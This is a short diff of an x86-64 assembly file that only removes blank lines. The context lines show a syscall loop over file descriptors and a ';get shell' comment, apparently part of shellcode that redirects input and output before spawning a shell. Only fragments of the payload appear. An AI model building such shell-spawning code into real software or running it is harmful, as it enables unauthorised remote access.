@@ -1,7 +1,5 @@
 bits 64
-
 section .text
-
 global _start
 
 _start:
@@ -60,7 +58,6 @@ _start:
         syscall
     dec r9
     jns .loop_fd
-  
   
   ;get shell
   
